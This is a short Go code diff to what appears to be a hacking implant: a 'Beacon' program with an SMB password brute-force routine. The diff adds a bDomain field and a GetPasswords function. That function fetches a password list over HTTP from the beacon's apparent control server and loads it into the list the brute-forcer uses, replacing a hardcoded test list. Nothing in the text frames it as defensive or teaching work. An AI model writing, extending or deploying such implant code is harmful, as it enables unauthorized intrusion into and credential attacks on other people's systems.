@@ -1,10 +1,11 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
 	"net"
-
-	// "net/http"
+	"net/http"
 	"os/user"
 	"slices"
 	"strings"
@@ -14,9 +15,10 @@ import (
 
 const MAX_PORTS = 65535
 
-var PASSWORDS = [...]string{"test", "test", "tset"}
+var PASSWORDS []string
 
 type Beacon struct {
+	bDomain  string
 	hostname string
 	ports    []int
 	domain   string
@@ -123,6 +125,18 @@ func (beaconObj *Beacon) SmbBrute() {
 	if beaconObj == nil {
 		fmt.Println("Password not found")
 	}
+}
+
+func (beaconObj Beacon) GetPasswords() {
+	httpObj, err := http.Get(beaconObj.bDomain)
+	if err != nil {
+		// DO SOMETHING
+	}
+	byteConversion, err := io.ReadAll(httpObj.Body)
+	if err != nil {
+		// DO SOMETHING
+	}
+	json.Unmarshal(byteConversion, &PASSWORDS)
 }
 
 func main() {
